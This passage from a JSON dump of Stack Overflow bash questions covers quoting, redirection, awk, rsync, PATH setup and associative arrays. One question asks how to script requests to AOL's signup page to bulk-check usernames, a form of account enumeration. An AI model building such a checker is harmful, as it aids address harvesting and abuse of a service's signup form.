DIR=\"$TMP_DIR\"\n   fi\n  fi\n done\n IFS=$OLDIFS\n echo \"$DIR\"\n}\n</code></pre>\n\n<p>to use it just do:</p>\n\n<pre><code> (searching on my home)\n$ searchPathInsensitive projects/insanewebproject\n/home/nenopera/Projects/InSaNEWEBproJECT\n\n(inside a project)\n$ searchPathInsensitive src/main/java/org/package/webprotocolhttpwrapper.java\n/home/nenopera/Projects/InSaNEWEBproJECT/src/main/java/org/package/WebProtocolHTTPWrapper.java\n\n$ searchPathInsensitive src/main/resources/logout.png\n/home/nenopera/Projects/InSaNEWEBproJECT/src/main/resources/LogOut.PNG\n</code></pre>\n\n<p>I guess the solution is related in any way with <strong>find -ipath</strong> as all I do with the function is search only for next element in path given on insensitive manner</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12927927,"title":"Bash redirection: save stderr/stdout to different files and still print them out on a console","body":"<p>Here is a simple program.</p>\n\n<pre><code>class Redirection {\n\npublic static void main (String args[]){\n    System.out.println(\"Hello World_Stdout\");\n    System.err.println(\"Hello World_Stderr\");\n}\n\n}\n</code></pre>\n\n<p>I want to see the all the outputs on a console, but at the same time I want to store stdout and stderr in different files. I tried the following command, to no avail.</p>\n\n<pre><code>$java Redirection 3&gt;&amp;1 2&gt;stderr 1&gt;stdout 1&gt;&amp;3 2&gt;&amp;3\n</code></pre>\n\n<p>stderr&amp; stdout files have the file size of 0.</p>\n\n<p>So basically I want to do what \"tee\" command does but I also want to capture stderr as well.</p>\n"},{"tags":["linux","bash"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":98,"score":1,"question_id":10159235,"title":"How to double-quote names with spaces in their name","body":"<p>Error: seems to be it showing up with a _ rather than a </p>\n\n<p>File tree looks like:</p>\n\n<pre><code>.\n|-- Christina Aguilera\n|   |-- Back To Basics . Ain't No Other Man.mp3 \n</code></pre>\n\n<p>However, script shows this:</p>\n\n<pre><code>.\n|-- Christina Aguilera\n|   |-- Back To Basics _ Ain't No Other Man.mp3\n</code></pre>\n\n<p>The Code:</p>\n\n<pre><code>    tag=$(tail -c 128 $path)\n    song_name=$(echo \"$tag\" | cut -c 4-33 | sed -r 's/ +$//')\n    artist_name=$(echo \"$tag\" | cut -c 34-63 | sed -r 's/ +$//')\n    album_name=$(echo \"$tag\" | cut -c 64-93 | sed -r 's/ +$//')\n    test -e \"$2/$artist_name\" || mkdir \"$2/$artist_name\"\n    ln -s $path \"$2/$artist_name/$album_name _ $song_name.mp3\"\ndone\n</code></pre>\n\n<p>How can I edit this code to resolve the error?</p>\n"},{"tags":["bash","shell","unix","operating-system","cat"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":65,"score":2,"question_id":12948611,"title":"Unexpected output from cat `bash` command","body":"<p>Can someone please explain this? I ran the commands as shown below </p>\n\n<pre><code>$ cat `bash`\n\n$ ls\n\n$ ctrl+D\n</code></pre>\n\n<p>and it's giving me some unexpected output on terminal. </p>\n\n<p>NOTE: <code>bash</code> is in backquotes.</p>\n"}]}
{"total":16352,"page":9,"pagesize":100,"questions":[{"tags":["linux","bash","shell","operators"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":78,"score":2,"question_id":12948456,"title":"Is there any difference between '=' and '==' operators in bash or sh","body":"<p>I realized that both '=' and '==' operators works in if statement. For example:</p>\n\n<pre><code>var=\"some string\"\nif [ \"$var\" == \"some string\" ];then\n    #doing something\nfi\n\nif [ \"$var\" = \"some string\" ];then\n    #doing something\nfi\n</code></pre>\n\n<p>Both if statement above worked well in bash and sh. I just wondered if there is any difference between them? Thanks...</p>\n"},{"tags":["bash","script","monitoring"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":12951175,"title":"Determine hostname of connected ethernet switch","body":"<p>I've a bonding on two interfaces. I'd like to monitor wether they are connected to different switches (the switches have hostnames).\nethX should be connected to switchX and ethY to switchY.</p>\n\n<p>Currently I'm checking this with following command:</p>\n\n<pre><code>tcpdump -vv -s0 -i ethX ether host 01:00:0c:cc:cc:cc\n</code></pre>\n\n<p>After a minute it prints out the hostname (and much more information) from the switch.</p>\n\n<p>Are there any other solutions to monitor this?</p>\n\n<p>Greeting</p>\n"},{"tags":["bash"],"answer_count":6,"favorite_count":3,"up_vote_count":8,"down_vote_count":0,"view_count":2213,"score":8,"question_id":6022384,"title":"bash tool to get nth line from a file","body":"<p>Is there a \"canonical\" way of doing that? I've been using <code>head -n | tail -1</code> which does the trick, but I've been wondering if there's a bash tool that specifically extracts a line (or a range of lines) from a file.</p>\n\n<p>EDIT: By \"canonical\" I mean a program whose main function is doing that.</p>\n"},{"tags":["bash","shell","script","xml-parsing","compare"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":12947028,"title":"Shell script to extract unique strings from filenames or from content of XML documents","body":"<p>Using a bash shell script, I would like to take a directory listing of files and only list unique instances of a specific string.</p>\n\n<p>The string (for example <code>0082230958089736545</code>) can be found in 2 places</p>\n\n<ol>\n<li><p>The filename (in the 4th section, the longest number)</p>\n\n<pre><code>AVAILITY.VT04.00090.0082230958089736545.72732411.20121017.053604220\n</code></pre></li>\n<li><p>Inside the XML Document</p>\n\n<pre><code>&lt;ENVELOPE&gt;\n&lt;HEADER&gt;\n&lt;ProviderTransID&gt;0082230958089736545&lt;/ProviderTransID&gt;\n&lt;/HEADER&gt;\n&lt;ENVELOPE&gt;\n</code></pre></li>\n</ol>\n\n<p>In the filename, the first 4 sections (including the section with the string I want to compare) is the same, whereas the last 3 sections change as those identify the process date and time the file was retried. </p>\n\n<p>Each instance of the string can be repeated up to 24 times. Right now I have to manually make sure I grab each instance of the string with my eyes, and I don't always trust those LOL. </p>\n\n<p>I want to generate a list of each string with no repetitions, then assign each string to its own variable for use later on in the script. </p>\n\n<p>As long as it can be done in a Bash shell script, I don't care if the string is extracted from the filename or from the content of the .XML document.</p>\n"},{"tags":["ruby","bash","install","rvm","ruby-1.9.3"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":540,"score":1,"question_id":12148054,"title":"Need to install Ruby 1.9.3 on Mac OS X Mountain Lion","body":"<p>I had Ruby 1.9.3 running on Mac OS X Lion (I had to use RVM because normal home brew install didn't work) and then installing Mountain Lion (or its subsequent update) has caused Ruby 1.9.3 to no longer be installed + all gems have been uninstalled and I'm back on Ruby 1.8.7</p>\n\n<p>I have the latest XCode version (4.4.1) installed and I've tried multiple different suggestions from similar StackOverflow questions with no success.</p>\n\n<p>What I want is a fresh start (if possible), I would like advice for how to completely uninstall any crap I've installed to do with Ruby and RVM and to start again! Then maybe I can get assistance with installing Ruby 1.9.3</p>\n\n<p>But I can give you an idea of what I'm doing at the moment which is failing...</p>\n\n<ul>\n<li><p>Executing <code>ruby -v</code> results in <code>ruby 1.8.7 (2012-02-08 patchlevel 358) [universal-darwin12.0]</code></p></li>\n<li><p>Executing <code>rvm -v</code> results in <code>rvm 1.15.7 (stable) by Wayne E. Seguin &lt;wayneeseguin@gmail.com&gt;, Michal Papis &lt;mpapis@gmail.com&gt; [https://rvm.io/]</code></p></li>\n<li><p>Executing <code>brew upgrade ruby</code> results in: <a href=\"http://pastebin.com/KetSau7k\" rel=\"nofollow\">http://pastebin.com/KetSau7k</a></p></li>\n<li><p>Executing <code>rvm install 1.9.3</code> results in: <a href=\"http://pastebin.com/8YKg4wXb\" rel=\"nofollow\">http://pastebin.com/8YKg4wXb</a> - which when I then press <code>q</code> to exit it continues to try and install and fails...</p></li>\n</ul>\n\n<p>Installing Ruby from source to: /Users/markmcdonnell/.rvm/rubies/ruby-1.9.3-p194, this may take a while depending on your cpu(s)...</p>\n\n<pre><code>ruby-1.9.3-p194 - #downloading ruby-1.9.3-p194, this may take a while depending on your connection...\nruby-1.9.3-p194 - #extracted to /Users/markmcdonnell/.rvm/src/ruby-1.9.3-p194 (already extracted)\nruby-1.9.3-p194 - #configuring \nError running ' ./configure --prefix=/Users/markmcdonnell/.rvm/rubies/ruby-1.9.3-p194 --enable-shared --disable-install-doc --with-libyaml --with-opt-dir=/Users/markmcdonnell/.rvm/usr ', please read /Users/markmcdonnell/.rvm/log/ruby-1.9.3-p194/configure.log\nThere has been an error while running configure. Halting the installation.\n</code></pre>\n\n<ul>\n<li>I've also tried <code>rvm install 1.9.3 --with-gcc=clang</code> but after an initial message you've seen already (where I press <code>q</code> to quit the message and continue with an install) it then tells me <code>You requested building with 'clang' but it is not in your path.</code></li>\n</ul>\n\n<p>There's also a number of other things I've installed and commands I've executed to try and get this blasted Ruby 1.9.3 to install but none of it has worked - hence why I think I might need to start from scratch (if possible?).</p>\n\n<p>Any help getting this installed (and a bit of a clean-up too) along with an explanation for someone who isn't very Bash/CLI minded would be greatly appreciated!</p>\n\n<p>Thanks.</p>\n"},{"tags":["linux","bash","ulimit"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":65,"score":2,"question_id":12945606,"title":"how does \"ulimit -v\" work in the Linux OS?","body":"<p>I would like to limit memory used by a process started through bash with the ulimit command on Linux.  I was wondering what OS mechanism is used to support ulimit.  In particular, is it based on cgroups?</p>\n"},{"tags":["bash"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":43,"score":2,"question_id":12941184,"title":"Setting up the \"mate\" command in bash","body":"<p>Attempting to setup bash so I can call the \"mate\" command to edit text files. After running this line, the link appears to exist but I'm still getting \"mate: command not found\"</p>\n\n<pre><code>ln -s /Applications/TextMate.app/Contents/Resources/mate ~/bin/mate/mate\n</code></pre>\n\n<ul>\n<li>Textmate is installed in applications </li>\n<li>using OSX Mountain Lion</li>\n<li>directory structure is in place</li>\n</ul>\n"},{"tags":["osx","bash","shell","application","applescript"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12945466,"title":"Apple script to run a shell script to get around permissions","body":"<p>I have created a shell .command on Mac OS X that I would like to distribute. Based on my testing, you can't execute the .command file by double clicking without changing permissions first ( making executable. ) I don't want users to use the terminal and change permissions, it's too hard for them.</p>\n\n<p>The shell script creates a folder structure for a project, based on where the script is. It needs to be able to run anywhere the user puts it.</p>\n\n<p>The research I have done indicates that I need to use an Apple script to run the file to prompt for the user's password to get around permissions.</p>\n\n<p>Any advice on how to do this?</p>\n"},{"tags":["bash","dictionary","hashtable","associative-array"],"answer_count":10,"favorite_count":19,"up_vote_count":39,"down_vote_count":0,"view_count":35428,"score":39,"question_id":1494178,"title":"How to define hash tables in bash?","body":"<p>Just what title says. I am surprised by insufficiency of results in Google search for this question! What I want to is the equivalent of <a href=\"http://diveintopython.net/getting_to_know_python/dictionaries.html\">Python dictionaries</a> but in bash (and hence, should work across OSX, Ubuntu and other major Linux distributions).</p>\n"},{"tags":["bash","debugging","if-statement","condition"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":50,"score":1,"question_id":12944988,"title":"Debugging BASH IF Conditions","body":"<p>I am getting an error when I try and run my assignment.</p>\n\n<pre><code>#!/bin/bash\n## Assignment 2\n\necho Please enter a User Name:\nread u\nif [ $u!=\"root\"]; then\n        echo Searching for Username!\n        grep $u /etc/passwd|sed 's/$u/hidden/gi'\nelif [ $u!=\"toor\"]; then\n        echo Root is NOT allowed.\nelse\n        echo Toor is definetely NOT allowed.\nfi\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>Please enter a User Name:\nuser1\n./assign2.sh: line 6: [bthiessen: command not found\n./assign2.sh: line 9: [bthiessen: command not found\nToor is definetely NOT allowed.\n</code></pre>\n\n<p>What is wrong with my if statements?</p>\n"},{"tags":["bash","unzip"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12945111,"title":"Unzip fails when specifying keyword","body":"<p>I need to unzip files matching a specific keyword in the name. A typical file will look like this:</p>\n\n<pre><code>JGS-Memphis~PSU~FVT~00000~JGM96911~1~P~1100~EPS10R0-15~CL10D1120A3271~0121017~141645.XML\n</code></pre>\n\n<p>When I do</p>\n\n<pre><code>unzip -o SOMEFILE.zip '*~PSU~*' -d psutmp/\n</code></pre>\n\n<p>It unzips the file above from <code>SOMEFILE.zip</code> without problem. But when I do</p>\n\n<pre><code>for i in `find . -name '*zip'`; do  unzip -o \"$i\" \\'*PSU*\\' -d psutmp/ ; done\n</code></pre>\n\n<p>It fails with a <code>filename not matched:  '*PSU*'</code> error. I tried removing the tick marks around PSU. Same problem. </p>\n\n<p>I also tried the <code>-C</code> option to match filenames case-insensitively </p>\n\n<pre><code>for i in `find . -name '*XML*zip'`; do  unzip -o \"$i\" -C *PSU* -d psutmp/ ; done\n</code></pre>\n\n<p>It fails with a</p>\n\n<pre><code>error:  cannot create psutmp/JGS-Memphis~PSU~FVT~00000~JGM96911~1~P~1100~EPS10R0-15~CL10D1120A3271~0121017~141645.XML\n</code></pre>\n\n<p>This is bunk. I am the root user of a development machine with 150GB of storage. Capacity is at 12%. What am I missing?</p>\n"},{"tags":["bash","hash","export"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":12944674,"title":"How to export an associative array (hash) in bash?","body":"<p>Related, but not a duplicate of: <a href=\"http://stackoverflow.com/questions/1494178/how-to-define-hash-tables-in-bash\">How to define hash tables in bash?</a></p>\n\n<p>I can define and use a bash hash, but I am unable to export it, even with the -x flag.  For example, the following works to export (and test exportation of) a normal string variable:</p>\n\n<pre><code>aschirma@graphics9-lnx:/$ export animal_cow=\"moo\"\naschirma@graphics9-lnx:/$ bash -c \"echo \\$animal_cow\"\nmoo\naschirma@graphics9-lnx:/$ \n</code></pre>\n\n<p>However, if I try to export a hash:</p>\n\n<pre><code>aschirma@graphics9-lnx:/$ declare -A -x animals\naschirma@graphics9-lnx:/$ animals[duck]=\"quack\"\naschirma@graphics9-lnx:/$ echo ${animals[duck]}\nquack\naschirma@graphics9-lnx:/$ bash -c \"echo \\${animals[duck]}\"\n\naschirma@graphics9-lnx:/$ \n</code></pre>\n\n<p>It seems the nested bash shell does not have the hash in its scope.  I did verify this also by manually entering the nested bash shell and attempting to use the hash interactively.</p>\n"},{"tags":["linux","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12944453,"title":"Assigning a variable after the contents are 'cut' in bash","body":"<p>I am iterating through a folder of files using bash, but I need to cut the preceding path.  For instance if I have this '/temp/test/filename' I want to cut off the '/temp/test/' and store the file name to a variable so I can write a log with the filename in it.</p>\n\n<p>Can anyone help me out? The problem is that the variable temp is always empty.</p>\n\n<p>Here is my bash code:</p>\n\n<pre><code>#!/bin/bash\n\nfor file in /temp/test/*\ndo\n    if [[ ! -f \"$file\" ]]\n    then\n        continue\n    fi\n\n    temp=\"$file\"|cut -d'/' -f3\n\n    $file &gt; /var/log/$temp$(date +%Y%m%d%H%M%S).log\ndone\n\nexit\n</code></pre>\n"},{"tags":["linux","osx","bash","rsync"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":1310,"score":2,"question_id":3331630,"title":"old rsync and spaces in filenames","body":"<p>Source directory is determined like so:</p>\n\n<pre><code>SHOW=${PWD##*/}\nSRC=wells@server.com:\"/mnt/bigfish/video/TV/${SHOW}/\"\n</code></pre>\n\n<p>So it comes out something like:</p>\n\n<pre><code>wells@server.com:/mnt/bigfish/video/TV/The Name Of the Show With Spaces/\n</code></pre>\n\n<p>Then trying to run rsync like so:</p>\n\n<pre><code>rsync -avz -e ssh \"${SRC}\" .\n</code></pre>\n\n<p>But it tells me that \"\"/mnt/bigfish/video/TV/The\" is not a directory, \"\"/mnt/bigfish/video/TV/Name\" is not a directory, etc, for however many space-delimited words are in the name of the source directory.</p>\n\n<p>How can I rectify this egregiously annoying issue?</p>\n\n<p><strong>UPDATE</strong> I'm running this on OS 10.6, and I ended up string-replacing spaces with escaped spaces like so:</p>\n\n<pre><code>SRC=wells@kittenfactory.com:\"/mnt/bigfish/video/TV/${SHOW// /\\ }/\"\n</code></pre>\n"},{"tags":["bash","solaris","path","canonical","symlink"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":2185,"score":2,"question_id":1245301,"title":"canonicalize a path name on solaris","body":"<p>On a GNU system I would just use <code>readlink -f $SOME_PATH</code>, but Solaris doesn't have readlink.</p>\n\n<p>I'd prefer something that works well in bash, but other programs are ok if needed.</p>\n\n<p><strong>Edit:</strong> The best I've come up with so far uses cd and pwd, but requires some more hackery to deal with files and not just directories.</p>\n\n<pre><code>cd -P \"$*\"\nREAL_PATH=`pwd`\n</code></pre>\n"},{"tags":["bash","for-loop","enums"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":83,"score":-1,"question_id":12935991,"title":"using enum in a bash script loop","body":"<p>let's say i have 14 compiler option to run exploration based on, I want to make a loop out of these in a bash script. one of them is like this:</p>\n\n<pre><code>echo \"dce\"\necho \"#####################################################################\"\nmkdir ./dce\nsed -i 's/constprop/dce/g'  ../../tools/most/script.most.plot_effect\n/home/zaccaria/projects/build/image/bin/most -x ../../tools/most/design_space.xml.LLVM_including_Vex_param_FIXED_BOUND_jpeg -f ../../tools/most/script.most.plot_effect -p\nmv all.csv FULL.db *.ps  most.node.0.0  normal_output  rand_output check   normal_input      rand_input st_shell_gplot_script.scr ./dce\necho \"dce_Finished\"\necho \"#####################################################################\"\n</code></pre>\n\n<p>so by defining all of them as :</p>\n\n<pre><code>compiler_option=([1]=constprop [2]=dce [3]=inline [4]=instcombine [5]=loop_reduce [6]=loop_rotate [7]=loop_unroll [8]=loop_unswitch [9]=mem2reg [10]=memcpyopt [11]=reassociate [12]=scalarrepl [13]=sccp [14]=simplifycfg)\n</code></pre>\n\n<p>I wanna put the exploration in a loop to avoid writing this script for 14 times.</p>\n\n<p>Thanks for your time ;)</p>\n\n<p>Amir</p>\n"},{"tags":["linux","bash","shell","scripting"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":2,"view_count":45,"score":0,"question_id":12941960,"title":"Does Bash have a way to get verbose output about expression evaluation?","body":"<p>Supposing that i want to know how my statements are axpanded and interpreted by the <code>bash</code>, how i'm supposed to act ?</p>\n"},{"tags":["bash","shell","sed","awk","grep"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":130,"score":0,"question_id":12936448,"title":"Using grep to remove lines from a file, where the keys exist in another file","body":"<p>I am working with 2 large CSV files. The smaller being a subset of the larger. The first field is a non-unique key, which is a customerID.</p>\n\n<p>I want to find all lines from the larger file which have the same value in field 1 as the smaller file, then find the delta between this result, and the original subset.</p>\n\n<p>I then want to remove all rows from the original subset which have a value in field one that exists in the delta.</p>\n\n<p>In other words: I want to remove any rows from the original smaller subset which has a custromerID which also exists in a row existing in the large original file, but not in the smaller subset.</p>\n\n<p>I am currently doing it like below, and I don't understand why the result is 0.</p>\n\n<p>There is obviously a flaw in my logic, and this is clearly not the most elegant way to to do this, so please, I'm open to suggestions for a better way.</p>\n\n<p>File: full.csv</p>\n\n<pre><code>,1052,tec101,UNIX\n,1052,ser303,UNIX\n,1052,backu2,UNIX\n,1052,sma114,UNIX\n,1052,appsup,UNIX\n,1052,emails,UNIX\n,1059,marygs,UNIX\n,39835,deepr2,UNIX\n,44536,hai499,UNIX\n,1274,lemo27,Windows\n,48567,wdanro,UNIX\n,81860,pro846,UNIX\n,1419,graphe,UNIX\n,83999,doerf1,UNIX\n,1551,taxtri,UNIX\n,1572,lodes4,UNIX\n,1603,wes244,Windows\n,102888,law642,UNIX\n,1700,au2960,UNIX\n</code></pre>\n\n<p>File: subset.csv</p>\n\n<pre><code>,1052,sma114,UNIX\n,1052,appsup,UNIX\n,1052,emails,UNIX\n,1059,marygs,UNIX\n,39835,deepr2,UNIX\n,44536,hai499,UNIX\n,1274,lemo27,Windows\n,48567,wdanro,UNIX\n,81860,pro846,UNIX\n,1419,graphe,UNIX\n</code></pre>\n\n<p>What I'm doing now:</p>\n\n<pre><code>[jgalley@linux1 sandbox]$ wc -l *\n 19 full.csv\n 10 subset.csv\n 29 total\n[jgalley@linux1 sandbox]$ cat subset.csv |  awk -F, '{print \",\"$2\",\"}' &gt; subset_keys\n[jgalley@linux1 sandbox]$ grep -F -f subset_keys full.csv | wc -l\n13\n[jgalley@linux1 sandbox]$ grep -F -f subset_keys full.csv | head -n2\n,1052,tec101,UNIX\n,1052,ser303,UNIX\n[jgalley@linux1 sandbox]$ grep -F -f subset_keys full.csv &gt; subset_keys_grep\n[jgalley@linux1 sandbox]$ cat subset_keys_grep | awk -F, '{print \",\"$2\",\"}' | head -n2\n,1052,\n,1052,\n[jgalley@linux1 sandbox]$ cat subset_keys_grep | awk -F, '{print \",\"$2\",\"}' | wc -l\n13\n[jgalley@linux1 sandbox]$ cat subset_keys_grep | awk -F, '{print \",\"$2\",\"}' &gt; keys_to_remove\n[jgalley@linux1 sandbox]$ grep -F -f keys_to_remove subset.csv | wc -l\n10\n[jgalley@linux1 sandbox]$ grep -F -f keys_to_remove subset.csv &gt; lines_to_remove\n[jgalley@linux1 sandbox]$ grep -Fv -f lines_to_remove  subset.csv | wc -l\n0\n</code></pre>\n\n<p>My expected result should be 7, or, without the count, the following:</p>\n\n<pre><code>,1059,marygs,UNIX\n,39835,deepr2,UNIX\n,44536,hai499,UNIX\n,1274,lemo27,Windows\n,48567,wdanro,UNIX\n,81860,pro846,UNIX\n,1419,graphe,UNIX\n</code></pre>\n\n<p>The result should be the 7 rows of the subset that have customerIDs that exist ONLY in the subset, and not also elsewhere in the full file.</p>\n"},{"tags":["osx","bash"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":66,"score":2,"question_id":12895017,"title":"Get formated time before midnight in bash on Mac OS","body":"<p>I would like to get time before midnight in bash on Mac OS (which has not the same date utility as many Linux distro).</p>\n\n<p>For example, at 23:56:03 I would like to get : \"00:03:59\".</p>\n"},{"tags":["bash","node.js"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":12941083,"title":"Get the output of a shell command in node.js","body":"<p>In a node.js, I'd like to find a way to obtain the output of a Unix terminal command. Is there any way to do this?</p>\n\n<pre><code>function getCommandOutput(commandString){\n    //now how can I implement this function?\n    //getCommandOutput(\"ls\") should print the terminal output of the shell command \"ls\"\n}\n</code></pre>\n"},{"tags":["osx","bash","unix"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12940379,"title":"Where are all the possible PATH settings?","body":"<p>I think I'm in over my head here. When I type echo $PATH...</p>\n\n<pre><code>$ echo $PATH\n/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin:/opt/X11/bin\n</code></pre>\n\n<p>When I open up .profile, I see...</p>\n\n<pre><code># MacPorts Installer addition on 2010-12-18_at_19:21:47: adding an appropriate PATH \n\nvariable for use with MacPorts.\nexport PATH=\"/usr/local/bin:/usr/local/sbin:/usr/local/mysql/bin\"\n#export PATH=/opt/local/bin:/opt/local/sbin:$PATH\n# Finished adapting your PATH environment variable for use with MacPorts.\ntest -r /sw/bin/init.sh &amp;&amp; . /sw/bin/init.sh\n</code></pre>\n\n<p>When I open up .bashrc...</p>\n\n<pre><code>PATH=$PATH:$HOME/.rvm/bin # Add RVM to PATH for scripting\n</code></pre>\n\n<p>And .bash_profile...</p>\n\n<pre><code>#export PATH=\"/usr/local/mysql/bin:$PATH\"[[ -s \"$HOME/.rvm/scripts/rvm\" ]] &amp;&amp; . \"$HOME/.rvm/scripts/rvm\" # Load RVM function\n</code></pre>\n\n<p>Where is the $PATH given by the echo command coming from? Is there yet another profile I need to edit? It's just so confusing to me. The motivation for all this is that I just want to get Ruby, various gems, and MySQL all playing nicely with each other. I installed Homebrew and RVM, but it's just been a nightmare getting everything to run.</p>\n\n<p>Any help would be greatly appreciated!</p>\n"},{"tags":["c","bash","script","argv","shebang"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":75,"score":2,"question_id":12922151,"title":"Expanding a relative path to a full path when running a C program in shell","body":"<p>I have a problem when my script needs to communicate with a C executable. I cannot get the script's full path, which I need to load and send to another process.</p>\n\n<p>The script's name is <code>myScript</code></p>\n\n<pre><code>#!/home/user/git/proyect/test\n\nhello this\n\nis a\nscript\n</code></pre>\n\n<p>and this is the source code of the C executable</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main (int argc, char *argv[]){\n    int count;\n\n    printf (\"Este programa fue llamado con: \\\"%s\\\".\\n\",argv[0]);\n    if (argc &gt; 1){\n        for (count=1; count&lt;argc; count++){\n            printf(\"argv[%d] = %s\\n\", count, argv[count]);\n        }\n    }\n    else{\n        printf(\"The command had no other arguments.\\n\");\n    }\n    return 0;\n }\n</code></pre>\n\n<p>If I run <code>myScript</code> from terminal, </p>\n\n<ul>\n<li><code>argv[0]</code> shows the executable's path (I guess that's because it's the info at <code>#!</code>).</li>\n<li><code>argv[1]</code> shows the first argument passed to the executable, i.e. \n<ul>\n<li>if I use <code>./myScript</code> as the argument, that is what I see (the relative path)</li>\n<li>if I use <code>/home/user/git/proyect/test/scriptFolder/myScript</code> as the argument, it shows the absolute path (which is what I need, but I don't want to write the full path in terminal every time)</li>\n</ul></li>\n</ul>\n\n<p>So my question is, how do I get the full path of <code>myScript</code> without passing its full path when calling the script? </p>\n"},{"tags":["python","bash","shell"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":1,"view_count":63,"score":0,"question_id":12940223,"title":"Download files modified in last 30 minutes from a URL","body":"<p>I am trying to download only files modified in the last 30 minutes from a URL. Can you please guide me how to proceed with this. Please let me know if I should use shell scripting or python scripting for this.</p>\n"},{"tags":["bash","post","curl","username","aol"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":12923561,"title":"(Bash) Submitting post data to an online form to check username availability","body":"<p>Firstly asked at: <a href=\"http://stackoverflow.com/questions/12888407/bash-useraol-com-email-availability-checker\">(Bash) $user@aol.com email availability checker</a> \n(with a well thought out beginning. Thanks again!)</p>\n\n<p>I'm looking to expand on this a bit:</p>\n\n<p>I'm trying to use either Curl, or a simple POST command (neither have proven working yet) to try to validate a list of usernames that I have to the following page:</p>\n\n<p><a href=\"https://new.aol.com/productsweb/\" rel=\"nofollow\">https://new.aol.com/productsweb/</a></p>\n\n<p>Essentially, this will be an availability checker for @aol.com email addresses.</p>\n\n<p>It doesn't have to neat, clean, or pretty, as long as it works.</p>\n\n<p>Does anyone have any idea where I can go from here?</p>\n"},{"tags":["linux","git","bash","shell"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":50,"score":2,"question_id":12937027,"title":"Bash environment variable not updating","body":"<p>I'm using the git post-checkout hook in my repo to the current branch into a variable, I then want to use it else where like PHP etc.</p>\n\n<p>Below is my post-checkout script:</p>\n\n<pre><code>#!/bin/bash\necho $GITBRANCH\nGITBRANCH=`git symbolic-ref HEAD | cut -d/ -f3-`\necho $GITBRANCH\nexport $GITBRANCH\n</code></pre>\n\n<p>However it doesn't update. For example:</p>\n\n<pre><code>&gt;git checkout master\nSwitched to branch 'master'\ndevelop\nmaster\n&gt;echo $GITBRANCH\ndevelop\n</code></pre>\n\n<p>Running the <code>GITBRANCH=git symbolic-ref HEAD | cut -d/ -f3-</code> command on it's own will then produce the current branch name.</p>\n\n<p>Why doesn't the hook update the $GITBRANCH variable globally?</p>\n"},{"tags":["mysql","linux","bash","csv"],"answer_count":14,"favorite_count":42,"up_vote_count":85,"down_vote_count":0,"view_count":68907,"score":85,"question_id":356578,"title":"How to output MySQL query results in csv format?","body":"<p>Is there an easy way to run a MySQL query from the linux command line and output the results in csv format?  </p>\n\n<p>Here's what I'm doing now:</p>\n\n<pre><code>mysql -u uid -ppwd -D dbname &lt;&lt; EOQ | sed -e 's/        /,/g' | tee list.csv\nselect id, concat(\"\\\"\",name,\"\\\"\") as name\nfrom students\nEOQ\n</code></pre>\n\n<p>It gets messy when there are a lot of columns that need to be surrounded by quotes, or if there are quotes in the results that need to be escaped.</p>\n"},{"tags":["bash","shell","awk"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12938810,"title":"awk script, need to return results on multi lines following keyword","body":"<p>Using this:</p>\n\n<pre><code>awk '$1 == \"pool\" { f=1; print $1,$2; next }         \n     f == 1 { if ($1 == \"pool\") { print }               \n              else if ($1 == \"members\") { print }   \n              else if ($0 ~ /^}/) { f=0 }               \n     }' bigip.conf\n</code></pre>\n\n<p>That works fine until the config has the IPs on following lines. \nHow can I get it to print the IPs if they are on following lines. \nThe config has both, some have it on the same line, some on then next 1, 2 or 3 lines.</p>\n\n<p>the data :</p>\n\n<pre><code>    pool pl_stage_xxx_microsites_9483 {\n       monitor all tcp_half_open\n       members {\n          11.11.11.11:9483 {}\n          11.22.22.22:9483 {\n             session user disabled\n          }\n       }\n}\n</code></pre>\n"},{"tags":["bash"],"answer_count":5,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":1220,"score":5,"question_id":3811345,"title":"How to pass all arguments passed to my bash script to a function of mine?","body":"<p>Let's say I have defined a function abc() that will handle all the logic related to analising the arguments passed to my script.</p>\n\n<p>How can I pass all arguments my bash script has received to it? The number of params is variable, so I can't just hardcode the arguments passed like this:</p>\n\n<pre><code>abc $1 $2 $3 